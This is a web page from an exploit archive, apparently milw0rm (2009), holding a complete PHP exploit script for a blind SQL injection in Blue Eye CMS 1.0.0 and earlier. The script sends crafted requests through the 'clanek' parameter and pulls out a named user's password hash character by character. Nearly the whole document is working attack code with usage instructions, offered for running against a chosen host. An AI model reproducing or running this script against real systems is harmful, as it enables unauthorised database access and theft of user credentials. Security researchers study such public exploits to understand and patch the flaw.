<html><head><title>Blue Eye CMS <= 1.0.0 (clanek) Blind SQL Injection Exploit</title></head><pre>--+++===============================================================+++--
--+++====== Blue Eye CMS &lt;= 1.0.0 Blind SQL Injection Exploit ======+++--
--+++===============================================================+++--


&lt;?php

function usage ()
{
	echo
		&quot;\n[+] Blue Eye CMS &lt;= 1.0.0 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] http://kent.dl.sourceforge.net/sourceforge/blueeyecms/blue_eye_cms-1_0_0_preRC.rar&quot;.
		&quot;\n[+] Author: darkjoker&quot;.
		&quot;\n[+] Site  : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Usage : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt;&quot;.
		&quot;\n[+] Ex.   : php xpl.php localhost /BlueEye admin&quot;.
		&quot;\n\n&quot;;
	exit ();
}

function query ($user, $pos, $chr)
{
	$query = &quot;x' OR ASCII(SUBSTRING((SELECT password FROM blueeye_users WHERE user = '{$user}'),{$pos},1))={$chr} OR '1' = '2&quot;;
	$query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
	$query = str_replace (&quot;'&quot;, &quot;%27&quot;, $query);
	return $query;
}

function decrypt ($hash)
{
	$sha1 = unpack (&quot;H*&quot;, base64_decode ($hash));
	return $sha1 [1];
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$fp = fsockopen ($hostname, 80);
	$chr = ord ($chr);
	$query = query ($user, $pos, $chr);

	$get = 
		&quot;GET {$path}/index.php?clanek={$query} HTTP/1.1\r\n&quot;.
		&quot;Host: {$hostname}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;
	fputs ($fp, $get);

	while (!feof ($fp))
		$reply .= fgets ($fp, 1024);
	
	fclose ($fp);

	preg_match (&quot;/Autor: (.+?)&lt;br&gt;/&quot;, $reply, $x);
	if (empty ($x [1]))
		return false;
	else
		return true;
}

if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&quot;;
$pos = 1;
$chr = 0;
echo &quot;\n[+] Finding password: &quot;;
while ($chr &lt; strlen  ($key))
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		$pass .= $key [$chr];
		echo $key [$chr];
		$chr = -1;
		$pos++;
	}
	$chr++;
}
echo &quot;\n[+] sha1 Hash: &quot;;
echo decrypt ($pass) . &quot;\n\n&quot;;

?&gt;

# milw0rm.com [2009-01-15]</pre></html>